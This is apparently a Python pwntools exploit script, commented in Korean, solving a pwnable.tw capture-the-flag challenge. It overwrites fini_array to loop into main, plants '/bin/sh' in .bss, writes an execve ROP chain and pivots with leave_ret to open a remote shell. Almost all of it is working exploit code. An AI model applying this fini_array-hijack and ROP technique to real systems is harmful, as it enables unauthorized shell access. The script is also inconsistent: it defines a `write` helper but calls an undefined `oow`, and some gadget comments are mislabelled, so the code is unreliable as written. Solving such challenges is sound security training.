from pwn import *

# 주소 및 가젯 설정 
main = 0x401b6d
fini_array = 0x4b40f0
bss = 0x4b92e0 #ROP체인을 쌓을 가짜 주소
call_fini = 0x402960

pop_rdi = 0x401696 #첫 번째 인자, "bin/sh"가 저장된 주소
pop_rsi = 0x406c30 #두 번째 인자, argv, 0
pop_rdx = 0x446e35 #세 번재 인자, envp, 0
pop_rax = 0x41e4af #네 번재 인자, execve, 0x3b(59)
pop_rbp = 0x401b2d #체인을 시작할 주소
syscall = 0x4022b4
leave_ret = 0x401c4b

#ROP 체인 조립, 주소 3개씩 묶어서 24바이트 3덩어리 생성
ROP = [
    p64(pop_rdi), p64(bss), p64(pop_rsi), 
    p64(0), p64(pop_rdx), p64(0),         
    p64(pop_rax), p64(0x3b), p64(syscall) 
]

p = remote("chall.pwnable.tw", 10105)

#입력하는 함수
def write(addr, data):
    p.sendafter(b"addr:", str(addr).encode())
    p.sendafter(b"data:", data)

#무한 루프 생성
write(fini_array, p64(call_fini) + p64(main))

#bSS에 셸코드 저장
write(bss, b"/bin/sh\x00")

# fini_array 뒤에 ROP 체인 배치
for i in range(3):
    idx = i * 3
    payload = ROP[idx] + ROP[idx+1] + ROP[idx+2]
    oow(fini_array + 0x10 + (i * 0x18), payload) #24바이트씩 맞춰적음

#체인 트리거
#leave_ret과 ret(+1) 가젯을 사용해 루프를 깸
oow(fini_array, p64(leave_ret) + p64(pop_rdi + 1))

p.interactive()